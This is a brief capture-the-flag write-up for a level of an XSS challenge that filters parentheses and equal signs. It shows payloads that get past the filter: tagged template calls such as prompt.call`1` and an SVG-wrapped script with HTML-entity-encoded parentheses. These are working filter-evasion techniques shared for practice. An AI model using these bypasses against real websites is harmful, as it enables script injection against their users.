This level sanitized parenthesis and equal signs.

There are some ways to call functions even without parenthesis in javascript.
Such as:
```javascript
alert`1`
```

But in this challenge, I don't know why this doesn't count as a win:
```javascript
prompt`1`
```

According to other's write-up, we need to call this to win:
```javascript
prompt.call`1`
```
---
There are alternative answers as well.
Actaully, the browser handle `<svg>` tag differently than any other tags.
It seems `<svg>` tags will be interpreted as XML again in the browser, so we can html entity encode some characters under  `<svg>` tag to bypass the sanitization.

There's one thing to be mentioned here, the encoding only works for content of tags, we can't use that directly on tags.

Payload:
```
<svg>
<script>
prompt&#x28;1&#x29;
</script>
</svg>
```